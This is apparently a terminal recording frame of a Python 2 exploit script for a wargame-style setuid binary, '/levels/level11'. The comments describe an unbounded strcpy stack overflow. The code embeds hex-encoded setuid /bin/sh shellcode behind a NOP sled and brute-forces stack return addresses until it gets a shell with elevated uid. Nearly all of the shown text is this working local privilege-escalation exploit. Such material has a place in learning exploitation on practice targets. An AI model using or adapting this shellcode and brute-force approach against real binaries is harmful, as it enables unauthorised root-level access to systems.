[931.187655, "o", "\u001b[1;40r\u001b[?12;25h\u001b[?12l\u001b[?25h\u001b[27m\u001b[m\u001b[H\u001b[2J\u001b[?25l\u001b[40;1H\"/dev/shm/e_bf11.py\" 60L, 1904C\u001b[>c\u001b[1;1Himport struct, os, pty, time, select, sys, tty\r\r\n# level11: strncpy(buf[8], argv[2], 16) with a strlen(buf)==7 gate on argv[2],\r\r\n# then strcpy(buf, argv[1]) unbounded. buf sits at ebp-0x8, so the saved return\r\r\n# address is 12 bytes into argv[1]. ASLR is off and the stack is RWE, so we put\r\r\n# the usual 55-byte setuid shellcode behind a NOP sled and probe for its address.\r\r\nsc = \"31c0b0c9cd8089c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd8031c050682f2f7368682f62696e89e350533\u001b[7;1H89e131d2b00bcd80\".decode(\"hex\")\r\r\ndef payload_for(addr):\r\r\n    return \"A\" * 12 + struct.pack(\"<I\", addr) + \"\\x90\" * 800 + sc\r\r\ndef probe(addr):\r\r\n    pid, fd = pty.fork()\r\r\n    if pid == 0:\u001b[13;9Hos.execve(\"/levels/level11\", [\"/levels/level11\", payload_for(addr), \"1234567\"], {})\r\r\n    tty.setraw(fd)\r\r\n    time.sleep(1.2)\r\r\n    os.write(fd, \"id\\n\\n\\n\")\r\r\n    out = \"\"\r\r\n    deadline = time.time() + 1.2\r\r\n    while time.time() < deadline:\u001b[20;9Hr, _, _ = select.select([fd], [], [], 0.05)\u001b[21;9Hif r:\u001b[22;13Htry:\u001b[23;17Hout += os.read(fd, 4096)\u001b[24;13Hexcept OSError:\u001b[25;17Hbreak\u001b[26;9Hif \"uid=\" in out:\u001b[27;13Hbreak\r\r\n    try:\u001b[29;9Hos.close(fd)\r\r\n    except OSError:\u001b[31;9Hpass\r\r\n    return \"uid=1012\" in out\r\r\nfor addr in range(0xbffff000, 0xbffffe00, 16):\r\r\n    if \"\\x00\" in struct.pack(\"<I\", addr):\u001b[35;9Hcontinue\r\r\n    if probe(addr):\u001b[37;9Hprint \"landed at\", hex(addr)\u001b[38;9Hsys.stdout.flush()\u001b[39;9Hbreak\u001b[40;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?12l\u001b[?25h"]
